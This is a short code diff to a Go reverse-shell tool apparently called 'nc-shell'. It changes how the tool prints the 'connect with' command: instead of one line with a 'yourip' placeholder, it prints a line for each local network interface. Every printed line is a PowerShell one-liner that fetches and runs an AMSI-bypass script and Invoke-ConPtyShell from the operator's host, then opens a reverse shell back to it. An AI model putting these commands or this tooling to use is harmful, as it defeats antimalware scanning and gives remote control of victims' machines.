@@ -3,6 +3,7 @@ package sessions
 import (
 	"fmt"
 	"nc-shell/src/terminal"
+	"nc-shell/src/utils"
 	"os"
 	"sort"
 	"strconv"
@@ -118,7 +119,10 @@ func SetOnlyWebserver(onlyWebserverString string) {
 		PrintOnlyWebserverOptions()
 		// If OnlyWebServer is enable we print the oneliner
 		if onlyWebserver {
-			log.Info("connect with: powershell IEX(IWR http://yourip:" + strconv.Itoa(OptionsSession.Port) + "/amsi-bypass.ps1);IEX(IWR http://yourip:" + strconv.Itoa(OptionsSession.Port) + "/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell yourIP " + strconv.Itoa(OptionsSession.Port))
+			log.Info("connect with: ")
+			for i, iface := range utils.ListInterfaces() {
+				fmt.Println("[" + strconv.Itoa(i) + "] powershell IEX(IWR http://" + iface.IP + ":" + strconv.Itoa(OptionsSession.Port) + "/amsi-bypass.ps1);IEX(IWR http://" + iface.IP + ":" + strconv.Itoa(OptionsSession.Port) + "/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell " + iface.IP + " " + strconv.Itoa(OptionsSession.Port) + "\n")
+			}
 		}
 		Restart()
 	} else {
